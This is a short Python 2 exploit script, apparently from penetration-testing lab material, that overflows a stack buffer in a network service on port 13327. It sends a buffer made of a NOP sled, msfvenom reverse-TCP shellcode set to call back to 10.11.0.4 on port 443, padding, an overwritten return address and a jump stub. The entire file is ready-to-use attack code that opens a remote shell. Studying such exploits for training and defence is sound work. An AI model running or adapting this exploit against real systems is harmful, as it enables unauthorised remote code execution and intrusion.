#!/usr/bin/python
import socket

# Change the target address

host = "192.168.199.44"
nop_sled = "\x90" * 8 # NOP sled

# Change the msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py  To your Target IP

shellcode =  b""
shellcode += b"\xbe\x04\x07\x25\x92\xd9\xea\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x12\x31\x70\x12\x83\xe8\xfc"
shellcode += b"\x03\x74\x09\xc7\x67\x45\xce\xf0\x6b\xf6\xb3"
shellcode += b"\xad\x01\xfa\xba\xb3\x66\x9c\x71\xb3\x14\x39"
shellcode += b"\x3a\x8b\xd7\x39\x73\x8d\x1e\x51\x44\xc5\x96"
shellcode += b"\x66\x2c\x14\x59\x69\x16\x91\xb8\xd9\x0e\xf2"
shellcode += b"\x6b\x4a\x7c\xf1\x02\x8d\x4f\x76\x46\x25\x3e"
shellcode += b"\x58\x14\xdd\xd6\x89\xf5\x7f\x4e\x5f\xea\x2d"
shellcode += b"\xc3\xd6\x0c\x61\xe8\x25\x4e"


padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))

# Change This is based on a debian system you may need to change the buffer

eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# output to terminal 
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
